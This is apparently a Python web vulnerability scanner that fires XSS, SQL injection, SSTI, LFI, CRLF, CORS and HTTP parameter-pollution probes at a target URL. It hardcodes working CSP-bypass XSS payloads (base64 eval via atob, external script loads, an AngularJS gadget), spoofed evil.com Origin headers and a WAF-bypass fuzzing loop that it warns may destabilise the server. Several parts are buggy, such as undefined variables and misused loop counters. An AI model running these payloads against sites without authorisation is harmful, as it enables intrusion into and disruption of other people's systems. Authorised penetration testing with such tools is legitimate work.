import requests
import argparse
import json
import time
import base64
from datetime import datetime

#some fancy stuff
warning = " [" + "\033[93mWARNING\033[0;0m" + "] "
info = " [" + "\033[92mINFO\033[0;0m" + "] "
fail = " [" + "\033[91mFAIL\033[0;0m" + "] "
vulnerability = " [" + "\033[1;35mVULNERABILITY\033[0;0m" + "] "

#a cool banner here
banner="""
                     .--.     \033[1;95mv1.0.0\033[0;0m   
            ,-.------+-.|  ,-.     
   ,--=======* )"("")===)===* )    
   �        `-"---==-+-"|  `-"     
   O                 '--'     \033[1;31mgithub.com/pwnsociety\033[0;0m 

"""

print(banner)
print("[\033[92m+\033[0;0m] Started scanning @ \033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m\n")

def check_website():
    try:
        requests.get(full_site, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies)
    
    except:
        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + fail + "Website seems to be down or is not responding, try again (with https:// or http://), or try --ignore-ssl to ignore SSL errors and continue scanning.")
        #exit()


def xss_scan():
    json_file = open('configs/xss_config/xss_config.json', 'r')
    json_data = json_file.read()

    obj = json.loads(json_data)
    for i in range(int(len(obj))):
        name = (str(obj[i].get('name')))
        payload = (str(obj[i].get('payload')))

        for parameter in params:
            #first we see if the value is being reflected or not
            print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Finding reflected point(s) for parameter {}".format(parameter))
            time.sleep(3)
            if "reflectedhere" not in requests.get(site + directory + "?" + parameter + "=reflectedhere", headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).text:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "No reflective point found, skipping...")
                break
            else:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mFound reflected point on parameter {}\033[0;0m".format(parameter))
                time.sleep(4)
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Fuzzing for XSS vulnerability since reflected point is detected")
                time.sleep(3)
            
                if arg.verbose:
                    print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing parameter {} for {}".format(parameter, name))
                else:
                    print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing for {} on parameter {} ({}/{})".format(name, parameter, str(i),len(obj)-1))
                if payload in requests.get(site + directory + "?" + parameter + "=" + payload, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).text or payload in requests.get(site + directory + "?" + parameter + "[]=" + payload, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies):
                    print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mParameter {} is vulnerable to {}\033[0;0m".format(parameter, name))
                    print("Payload: {}".format(payload))
                else:
                    pass
                    
    csp_audit = input("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "\033[1mThe basic XSS scanning is finished, do you want to scan further for bypassing CSP techniques to perform XSS? (recommended) [Y/n]: \033[0;0m")
    
    if csp_audit == "y" or csp_audit == "Y":
        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + warning + "\033[1mStarting analysing for CSP-Headers\033[0;0m")
        time.sleep(2)
        
        req = requests.get(site + directory + "?" + parameter + "=test", headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies)
        
        if "Content-Security-Policy" in req.headers:
            print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + warning + "\033[1mCSP Header detected! Analyzing CSP Polocies for vulnerability\033[0;0m")
            time.sleep(2)
            
            if "unsafe-inline" in req.headers['Content-Security-Policy']:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mCSP 'unsafe-inline' detected. \nThis policy allows <script> and <style> chunks tobe interpreted\033[0;0m")
                time.sleep(2)
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Trying to bypass 'unsafe-inline'")
                csp_xss = '"/><script src="http://example.com";</script>'
                
                if csp_xss in requests.get(site + directory + "?" + parameter + csp_xss, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).text:
                    print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "CSP 'unsafe-inline' bypassed with the payload: " + csp_xss)
                else:
                    print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Bruteforcing for 'unsafe-inline' policy bypass")
                    
            if "script-src 'self'" in req.headers['Content-Security-Policy']:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + warning + "\033[1mCSP 'script-src self' detected. Trying to bypass\033[0;0m")
                time.sleep(2)
                csp_xss_self = ['<script ?/src="data:+,\\u0061lert%281%29">/</script>','<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="></object>']
                for xss in csp_xss_self:
                    if xss in requests.get(site + directory + "?" + parameter + xss, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).text:
                        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "CSP 'script-src self' bypassed with the payload: " + xss)
                        
                    else:
                        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Bruteforcing for 'script-src' policy bypass")
                        
            if "unsafe-eval" in req.headers['Content-Security-Policy']:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + warning + "\033[1mCSP 'unsafe-eval' detected. Allows string code executing functions like eval, setTimeout, setInterval or CSSStyleSheet.insertRule()\033[0;0m")
                time.sleep(2)
                csp_xss_list = ['"><img src=x id=PHNjcmlwdD5hbGVydCgiSGV sbG8iKTs8L3NjcmlwdD4=&#61;&#61; onerror=eval(atob(this.id))>', '<script src="data:;base64,PHNjcmlwdD5hbGVydCgiSGV sbG8iKTs8L3NjcmlwdD4="></script>', "script=document.createElement('script');", "script.src='//example.com';", 'window.frames[0].document.head.appendChild(script);']
                for csp_xss in csp_xss_list:
                    if csp_xss in requests.get(site + directory + "?" + parameter + csp_xss, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).text:
                        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mCSP 'unsafe-eval' bypassed with the payload:\033[0;0m " + csp_xss)
                        
                    else:
                        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Bruteforcing for 'unsafe-eval' policy bypass")
                        
            if "https: data *;" in req.headers['Content-Security-Policy']:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + warning + "\033[1mCSP with Wildcard policy detected, trying to bypass it\033[0;0m")
                time.sleep(2)
                csp_xss = '''"/>'><script src=http://example.com></script>'''
                if csp_xss in requests.get(site + directory + "?" + parameter + csp_xss, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).text:
                    print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mCSP with Wildcard policy bypassed with the payload:\033[0;0m " + csp_xss)
                        
                else:
                    print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Bruteforcing for 'unsafe-eval' policy bypass")
                    
            if "object-src" not in req.headers['Content-Security-Policy'] and "default-src" not in req.headers['Content-Security-Policy']:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mThere is a lack of 'object-src' and 'default-src'. Generating the proper list of payloads to bruteforce\033[0;0m ")
                
                csp_xss_list = ["<object data=javascript:eval(atob(`PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=`))></object>",
                                    '''">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'><param name="AllowScriptAccess" value="always"></object>''']
                for csp_xss in csp_xss_list:
                    if csp_xss in requests.get(site + directory + "?" + parameter + csp_xss, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).text:
                        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mCSP 'unsafe-inline' bypassed with the payload:\033[0;0m " + csp_xss)
                        
                    else:
                        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Bruteforcing for 'unsafe-inline' policy bypass")
                        
            if "ajax.googleapis.com" in req.headers['Content-Security-Policy']:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mDetected policy: AngularJS and whitelisted domain. Generating payloads\033[0;0m ")

                csp_xss_list = [
                        '"><script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>',
                        'ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>']
                for csp_xss in csp_xss_list:
                    if csp_xss in requests.get(site + directory + "?" + parameter + csp_xss, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).text:
                        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mCSP bypassed with the payload:\033[0;0m " + csp_xss)
                        
                    else:
                        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Bruteforcing for policy bypass")
                    
    hpp = input("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "\033[1mDo you want to scan further for XSS WAF Bypass via Parameter Pollution? (recommended) [Y/n]: \033[0;0m")
    if hpp == "y" or hpp == "Y":
        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + warning + "\033[1mThe following scan will send a huge ammount of requests and it might increase the instability on the target server. Use it at your own risk!\033[0;0m")
        time.sleep(2)

        json_file = open('configs/xss_config/xss_config.json', 'r')
        json_data = json_file.read()
        obj = json.loads(json_data)
        
        i = 1
        
        for i in range(int(len(obj))):
            name = (str(obj[i].get('name')))
            payload = (str(obj[i].get('payload')))
        

            while i < len(payload):
                if payload in requests.get(site + directory + "?" + parameter + "=" + payload[0 : i] + "&" + parameter + "=" + payload[i :], headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).text:
                    print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mWAF bypassed via Parameter Pollution with {}\033[0;0m".format(name))
                    print("Payload: {}".format(site + directory + "?" + parameter + "=" + payload[0 : i] + "&" + parameter + "=" + payload[i :]))
                    i = i + 1
                else:    
                    print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Scanning for XSS Bypass via Parameter Pollution with {}".format(name))
                    i = i + 1

def user_agent_scan():
    print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Checking for User-Agent SQL injection")
    json_file = open('configs/sqli_config.json', 'r')
    json_data = json_file.read()

    obj = json.loads(json_data)
    for i in range(int(len(obj))):
        name = (str(obj[i].get('name')))
        payload = (str(obj[i].get('payload')))
        timeout = (str(obj[i].get('timeout')))

        header = {'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1' + payload}
            
        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing for {} in User-Agent HTTP Header ({}/{})".format(name, str(i),len(obj)-1))
        sqli = requests.get(site, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies)
        if sqli.elapsed.total_seconds() >= float(timeout):
            print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mParameter {} might be vulnerable to {}\033[0;0m".format(parameter, name))
            print("Payload: {}".format(payload))
            break
        else:
            pass   
    

def ssti_scan():
    json_file = open('configs/ssti_config.json', 'r')
    json_data = json_file.read()

    obj = json.loads(json_data)
    for i in range(int(len(obj))):
        name = (str(obj[i].get('name')))
        payload = (str(obj[i].get('payload')))
        response = (str(obj[i].get('response')))

        for parameter in params:
            if arg.verbose:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing parameter {} for {}".format(parameter, name))
            else:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing for {} on parameter {} ({}/{})".format(name, parameter, str(i),len(obj)-1))
            if response in requests.get(site + directory + "?" + parameter + "=" + payload, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).text:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mParameter {} might be vulnerable to {}\033[0;0m".format(parameter, name))
                print("Payload: {}".format(payload))
            else:
                pass
                
def lfi_scan():
    json_file = open('configs/lfi_config.json', 'r')
    json_data = json_file.read()

    obj = json.loads(json_data)
    for i in range(int(len(obj))):
        name = (str(obj[i].get('name')))
        payload = (str(obj[i].get('payload')))
        response = (str(obj[i].get('response')))

        for parameter in params:
            if arg.verbose:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing parameter {} for {}".format(parameter, name))
            else:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing for {} on parameter {} ({}/{})".format(name, parameter, str(i),len(obj)-1))
            if response in requests.get(site + directory + "?" + parameter + "=" + payload, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).text:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "\033[1mParameter {} might be vulnerable to {}\033[0;0m".format(parameter, name))
                print("Payload: {}".format(payload))
                break
            else:
                pass   
                
def cipher_scan():
    cookies = str(arg.cipher_scan)
    print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Fuzzing for any serialization value inside the Cookie's value")
    if "ACED0005" in cookies or "AC ED 00 05" in cookies:
        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mPossible Java serialization detected in HEX Format inside cookies.\033[0;0m")
    elif "rO0" in cookies:
        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mPossible Java serialization detected in Base64 format inside cookies\033[0;0m")
        time.sleep(2)
    elif "BA" in cookies:
        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mPossible Ruby serialization detected in Base64 format inside cookies\033[0;0m")
        time.sleep(2)
    elif "H4sIA" in cookies:
        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mPossible compressed serialization detected in Base64 format inside cookies\033[0;0m")
        time.sleep(2)
    elif "eyJ" in cookies:
        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mCookie is a JWT Token, confirming if Cookie is serialised or not\033[0;0m")
        time.sleep(2)
        b = base64.b64decode(cookies)
        s = b.decode("utf-8")
        if "py/object" in s:
            print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mCookie is a Python serialized object\033[0;0m")
            time.sleep(1)
            print("Exploitation: https://secure-cookie.io/attacks/insecuredeserialization/") 
    
    #disable this if the cookie isn't base64    
    elif "\\n" in str(base64.b64decode(cookies)):
        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + "Possible Pickle serialization detected inside cookies") 
        time.sleep(2)

def cookie_scan():
    print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Fuzzing if Cookie's value are being reflected")
    
    #THE BUG IS HERE BECAUSE I NEED TO FIND A WAY TO EXTRACT COOKIE FIRST THAN APPEND THE PAYLOAD
    if "reflectedhere" in requests.get(site, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies={"Cookies": "reflectedhere"}).text:
        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "\033[1mCookie is reflecting values, there might be a Cookie-Based Injection, go check it manually via Burp\033[0;0m")
        time.sleep(2) 
    
    print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Checking for Cookie-Based SQL injection")
    json_file = open('configs/sqli_config.json', 'r')
    json_data = json_file.read()

    obj = json.loads(json_data)
    for i in range(int(len(obj))):
        name = (str(obj[i].get('name')))
        payload = (str(obj[i].get('payload')))
        timeout = (str(obj[i].get('timeout')))

        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing for {} in Cookie ({}/{})".format(name, str(i),len(obj)-1))
        sqli = requests.get(site, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies={"Cookies": payload})
        if sqli.elapsed.total_seconds() >= float(timeout):
            print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mParameter {} might be vulnerable to {}\033[0;0m".format(parameter, name))
            print("Payload: {}".format(payload))
            break
        else:
            pass   
    
    cookie_based_sql = requests.get(site, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies={"Cookies": "'"})
    if "SQL syntax" in cookie_based_sql.text or "error" in cookie_based_sql.text:
        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mCookie-based SQL injection might be found (Type: Union-Based SQLi)\033[0;0m")
        time.sleep(2)
        
def sqli_scan():
    json_file = open('configs/sqli_config.json', 'r')
    json_data = json_file.read()

    obj = json.loads(json_data)
    for i in range(int(len(obj))):
        name = (str(obj[i].get('name')))
        payload = (str(obj[i].get('payload')))
        timeout = (str(obj[i].get('timeout')))
        
        for parameter in params:
            if arg.verbose:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing parameter {} for {}".format(parameter, name))
            else:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing for {} on parameter {} ({}/{})".format(name, parameter, str(i),len(obj)-1))
            if requests.get(site + directory + "?" + parameter + "=" + payload, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).elapsed.total_seconds() >= float(timeout):
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mParameter {} might be vulnerable to {}\033[0;0m".format(parameter, name))
                print("Payload: {}".format(payload))
                break
            else:
                pass   
                
def crlf_scan():
    json_file = open('configs/crlf_config.json', 'r')
    json_data = json_file.read()

    obj = json.loads(json_data)
    for i in range(int(len(obj))):
        name = (str(obj[i].get('name')))
        payload = (str(obj[i].get('payload')))
        response = (str(obj[i].get('response')))

        for parameter in params:
            if arg.verbose:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing parameter {} for {}".format(parameter, name))
            else:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing for {} on parameter {} ({}/{})".format(name, parameter, str(i),len(obj)-1))
            if response in requests.get(site + directory + "?" + parameter + "=" + payload, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).headers or response in requests.get(site + "/" + payload, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).headers:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "\033[1mParameter {} might be vulnerable to {}\033[0;0m".format(parameter, name))
                print("Payload: {}".format(payload))
                break
            else:
                pass
 
def cors_scan():
    if "http://" in site:
        domain = site[7:]
    elif "https://" in site:
        domain = site[8:]
    
    print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing for Basic Origin reflection payload")
    if "https://evil.com" in requests.get(site, headers={"Origin": "https://evil.com"}, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).headers:
        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mFWebsite is vulnerable to Basic Origin Reflection payload\033[0;0m")
    else:
        pass
    
    print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing for Trusted null Origin payload")
    if "null" in requests.get(site, headers={"Origin": "null"}, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).headers:
        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mFWebsite is vulnerable to Trusted null Origin payload\033[0;0m")
    else:
        pass
        
    print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing for Whitelisted null origin value payload")
    if "null" in requests.get(site, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).headers:
        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mFWebsite is vulnerable to Whitelisted null origin value payload\033[0;0m")
    else:
        pass
        
    print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing for Trusted subdomain in Origin payload")
    if "evil." + str(domain) in requests.get(site, headers={"Origin": "evil." + str(domain)}, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).headers:
        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mFWebsite is vulnerable to Trusted subdomain in Origin payload\033[0;0m")
    else:
        pass
        
    print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing for abuse on not properly Domain validation")
    if "evil" + str(domain) in requests.get(site, headers={"Origin": "evil" + str(domain)}, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).headers:
        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mFWebsite is vulnerable to abuse on not properly Domain validation\033[0;0m")
    else:
        pass
        
    print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing for Origin domain extension not validated vulnerability")
    if str(domain) + ".evil.com" in requests.get(site, headers={"Origin": str(domain) + ".evil.com"}, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).headers:
        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mFWebsite is vulnerable to Origin domain extension not validated vulnerability\033[0;0m")
    else:
        pass
        
        
    chars=["!", "(", ")", "'", ";", "=", "^", "{", "}", "|", "~", '"', '`', ",", "%60", "%0b"]
    for char in chars:
        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing for Advanced CORS Bypassing using {}".format(char))
        if str(domain) + char + ".evil.com" in requests.get(site, headers={"Origin": str(domain) + char + ".evil.com"}, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).headers:
            print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mFWebsite is vulnerable tAdvanced CORS Bypassing using special characters + encoded\033[0;0m")
        else:
            pass
            
def parameter_pollution():
    json_file = open('configs/xss_config/xss_config.json', 'r')
    json_data = json_file.read()

    obj = json.loads(json_data)
    for i in range(int(len(obj))):
        name = (str(obj[i].get('name')))
        payload = (str(obj[i].get('payload')))

        for parameter in params:
            param = params[parameter]
            if param == "":
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + warning + "\033[1mThe following parameter {} doesn't have any value. You are required to add one.\033[0;0m".format(parameter))
                exit()
            else:
                #first we see if the value is being reflected or not
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Finding reflected point(s) via Parameter Pollution for parameter {}".format(parameter))
                time.sleep(3)
                if "reflectedhere" not in requests.get(arg.full_site + "&" + parameter + "=" + payload, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).text:
                    print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "No reflective point found via Parameter Pollution, skipping...")
                    break
                else:
                    print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mFound reflected point via Parameter Pollution for parameter {}\033[0;0m".format(parameter))
                    time.sleep(4)
                    print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Fuzzing for XSS vulnerability since reflected point is detected")
                    time.sleep(3)
            
                    if arg.verbose:
                        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing parameter {} for Parameter Pollution {}".format(parameter, name))
                    else:
                        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing for Parameter Pollution {} on parameter {} ({}/{})".format(name, parameter, str(i),len(obj)-1))
                    if payload in requests.get(site + directory + "?" + parameter + "=" + payload, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).text:
                        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mParameter {} is vulnerable to {} via Parameter Pollution\033[0;0m".format(parameter, name))
                        print("Payload: {}".format(payload))
                    else:
                        pass
                    
    #the same procedure, but for sqli    
    json_file = open('configs/sqli_config.json', 'r')
    json_data = json_file.read()

    obj = json.loads(json_data)
    for i in range(int(len(obj))):
        name = (str(obj[i].get('name')))
        payload = (str(obj[i].get('payload')))
        timeout = (str(obj[i].get('timeout')))
        
        for parameter in params:
            if arg.verbose:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing parameter {} for {} via Parameter Pollution".format(parameter, name))
            else:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing for {} via Parameter Pollution on parameter {} ({}/{})".format(name, parameter, str(i),len(obj)-1))
            if requests.get(arg.full_site + "&" + parameter + "=" + payload, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).elapsed.total_seconds() >= float(timeout):
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + vulnerability + "\033[1mParameter {} might be vulnerable to {} via Parameter Pollution\033[0;0m".format(parameter, name))
                print("Payload: {}".format(payload))
                break
            else:
                pass              
           
    #parameter pollution for open redirects and possible xss
    json_file = open('configs/openredirect_config.json', 'r')
    json_data = json_file.read()

    obj = json.loads(json_data)
    for i in range(int(len(obj))):
        name = (str(obj[i].get('name')))
        payload = (str(obj[i].get('payload')))

        for parameter in params:
            if arg.verbose:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing parameter {} for {} via Parameter Pollution".format(parameter, name))
            else:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing for {} via Parameter Pollution on parameter {} ({}/{})".format(name, parameter, str(i),len(obj)-1))
            if "google.com" in requests.get(arg.full_site + "&" + parameter + "=" + payload, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).url:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "\033[1mParameter {} might be vulnerable to {}\033[0;0m".format(parameter, name))
                print("Payload: {}".format(payload))
            else:
                pass
    
    json_file = open('configs/openredirect_xss_config.json', 'r')
    json_data = json_file.read()

    obj = json.loads(json_data)
    for i in range(int(len(obj))):
        name = (str(obj[i].get('name')))
        payload = (str(obj[i].get('payload')))

        for parameter in params:
            if arg.verbose:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing parameter {} for {}".format(parameter, name))
            else:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Testing for {} via Parameter Pollution on parameter {} ({}/{})".format(name, parameter, str(i),len(obj)-1))
            if payload in requests.get(arg.full_site + "&" + parameter + "=" + payload, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies).text:
                print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "\033[1mParameter {} might be vulnerable to {} via HTTP Parameter Pollution\033[0;0m".format(parameter, name))
                print("Payload: {}".format(payload))
            else:
                pass        

def xxe_scan():
    req = requests.get(site, headers=header, proxies=proxies, allow_redirects=allow_redirects, verify=verify, cookies=cookies)
    print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + warning + "\033[1mAnalyzing Content-type Header for vulnerabilities\033[0;0m")
    time.sleep(2)
            
    if "application/xml" in req.headers['Content-type']:
        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "\033[1mapplication/xml detected, server might be vulnerable to XXE\033[0;0m")
        return
        
    elif "text/xml" in req.headers['Content-type']:
        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "\033[1mtext/xml detected, server might be vulnerable to XXE\033[0;0m")
        return
    
    else:
        print("[\033[94m" + datetime.now().strftime("%H:%M:%S") + "\033[0;0m]" + info + "Analysing how the server responses to XML data headers")
